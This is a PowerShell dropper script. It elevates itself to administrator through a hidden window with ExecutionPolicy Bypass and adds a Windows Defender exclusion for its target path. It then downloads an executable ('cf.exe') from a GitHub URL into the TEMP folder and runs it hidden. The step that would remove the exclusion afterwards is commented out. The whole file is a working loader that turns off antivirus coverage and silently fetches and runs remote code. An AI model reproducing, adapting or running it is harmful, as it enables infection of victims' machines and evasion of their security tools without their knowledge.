param(
    [string]$OriginalTemp = $env:TEMP,
    [string]$FileName = "cf.exe",
    [string]$RepoUrl = "https://github.com/monkbytting/client/blob/main/Cbuilt.exe"
)

# Function to log messages (optional file logging)
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Output "[$timestamp] $Message"
    # Optional: Add to a log file
    # Add-Content -Path "$env:TEMP\runner.log" -Value "[$timestamp] $Message"
}

# Check for admin privileges and elevate if needed
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Log "Elevating to admin privileges..."
    $expandedTemp = [System.Environment]::ExpandEnvironmentVariables($OriginalTemp)
    $elevatedCommand = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`" -OriginalTemp `"$expandedTemp`" -FileName `"$FileName`" -RepoUrl `"$RepoUrl`""
    try {
        (New-Object -ComObject Shell.Application).ShellExecute('pwsh.exe', $elevatedCommand, '', 'runas', 0)
        exit
    }
    catch {
        Write-Log "Failed to elevate privileges: $_"
        exit 1
    }
}

# Main execution block
try {
    Write-Log "Starting execution..."

    # Resolve and validate output path
    $output = Join-Path $OriginalTemp $FileName -Resolve
    $outputDir = Split-Path $output -Parent
    Write-Log "Target path: $output"

    # Ensure directory exists
    if (-not (Test-Path $outputDir)) {
        Write-Log "Creating directory: $outputDir"
        New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
    }

    # Add Windows Defender exclusion (only if necessary)
    if ((Get-MpPreference).ExclusionPath -notcontains $output) {
        Write-Log "Adding exclusion to Windows Defender: $output"
        Add-MpPreference -ExclusionPath $output -ErrorAction Stop
    }

    # Download the executable
    $downloadUrl = "$RepoUrl/$FileName"
    Write-Log "Downloading from: $downloadUrl"
    $ProgressPreference = 'SilentlyContinue'
    Invoke-WebRequest -Uri $downloadUrl -OutFile $output -TimeoutSec 30 -ErrorAction Stop

    # Verify file exists and is valid
    if (Test-Path $output) {
        Write-Log "File downloaded successfully, executing: $output"
        Start-Process -FilePath $output -WindowStyle Hidden -ErrorAction Stop
    }
    else {
        throw "Downloaded file not found at: $output"
    }

    Write-Log "Execution completed successfully."
}
catch {
    Write-Log "Error occurred: $_"
    exit 1
}
finally {
    # Optional cleanup (e.g., remove Defender exclusion)
    # Write-Log "Cleaning up Defender exclusion..."
    # Remove-MpPreference -ExclusionPath $output -ErrorAction SilentlyContinue
}